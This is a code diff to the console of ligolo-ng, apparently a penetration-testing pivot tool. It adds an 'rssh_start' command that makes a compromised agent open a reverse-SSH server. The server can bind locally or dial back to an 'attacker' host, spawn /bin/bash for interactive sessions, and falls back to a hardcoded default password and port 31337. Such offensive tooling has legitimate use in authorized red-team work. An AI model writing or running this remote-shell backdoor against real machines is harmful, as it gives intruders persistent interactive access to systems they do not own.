@@ -39,6 +39,7 @@ import (
 	"github.com/jedib0t/go-pretty/v6/table"
 	"github.com/jedib0t/go-pretty/v6/text"
 	"github.com/nicocha30/ligolo-ng/pkg/controller"
+	"github.com/nicocha30/ligolo-ng/pkg/protocol"
 	"github.com/nicocha30/ligolo-ng/pkg/proxy"
 	"github.com/nicocha30/ligolo-ng/pkg/proxy/netstack"
 	"github.com/sirupsen/logrus"
@@ -811,6 +812,53 @@ App.AddCommand(&grumble.Command{
 				return
 			}()
 
+			return nil
+		},
+	})
+
+	App.AddCommand(&grumble.Command{
+		Name:      "rssh_start",
+		Help:      "Start the embedded reverse-SSH server on the current agent",
+		Usage:     "rssh_start [--port 31337] [--lhost attacker] [--pass secret] ...",
+		HelpGroup: "Reverse SSH",
+		Flags: func(f *grumble.Flags) {
+			f.StringL("pass", "letmeinbrudipls", "SSH password for incoming connections")
+			f.StringL("key", "", "authorized public key (empty = disabled)")
+			f.StringL("shell", "/bin/bash", "shell to spawn for interactive sessions")
+			f.UintL("port", 31337, "SSH listen/dial-back port")
+			f.StringL("lhost", "", "attacker SSH host to dial back to (empty = bind mode)")
+			f.StringL("luser", "reverse", "username for reverse dial-back")
+			f.UintL("bport", 8888, "port to bind on attacker side (reverse mode)")
+			f.BoolL("no-shell", false, "deny shell/exec — port-forwarding only")
+		},
+		Run: func(c *grumble.Context) error {
+			if _, ok := AgentList[CurrentAgentID]; !ok {
+				return ErrInvalidAgent
+			}
+			currentAgent := AgentList[CurrentAgentID]
+			if currentAgent.Session == nil {
+				return ErrInvalidAgent
+			}
+			req := protocol.RsshStartRequestPacket{
+				Password:      c.Flags.String("pass"),
+				AuthorizedKey: c.Flags.String("key"),
+				Shell:         c.Flags.String("shell"),
+				Port:          uint32(c.Flags.Uint("port")),
+				LHost:         c.Flags.String("lhost"),
+				LUser:         c.Flags.String("luser"),
+				BPort:         uint32(c.Flags.Uint("bport")),
+				NoShell:       c.Flags.Bool("no-shell"),
+			}
+			if err := currentAgent.StartRssh(req); err != nil {
+				return err
+			}
+			mode := "bind"
+			addr := fmt.Sprintf(":%d", req.Port)
+			if req.LHost != "" {
+				mode = "reverse"
+				addr = fmt.Sprintf("%s:%d → bport %d", req.LHost, req.Port, req.BPort)
+			}
+			logrus.Infof("Reverse-SSH server started on agent (%s mode, %s)", mode, addr)
 			return nil
 		},
 	})
